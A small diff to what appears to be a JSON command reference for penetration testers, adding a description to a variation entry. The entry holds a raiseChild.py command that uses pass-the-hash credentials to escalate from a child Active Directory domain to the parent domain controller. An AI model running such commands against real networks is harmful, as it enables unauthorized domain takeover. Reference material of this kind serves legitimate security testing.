@@ -208,7 +208,8 @@
   "variations": [
     {
       "label": "Pass-the-hash instead of password",
-      "command": "raiseChild.py -target-exec <parent_dc_ip> <child_domain>/<child_admin> -hashes <lm>:<nt>"
+      "command": "raiseChild.py -target-exec <parent_dc_ip> <child_domain>/<child_admin> -hashes <lm>:<nt>",
+      "description": "Pass-the-hash instead of password. See the command syntax for exact parameters and flags."
     }
   ],
   "steps": [
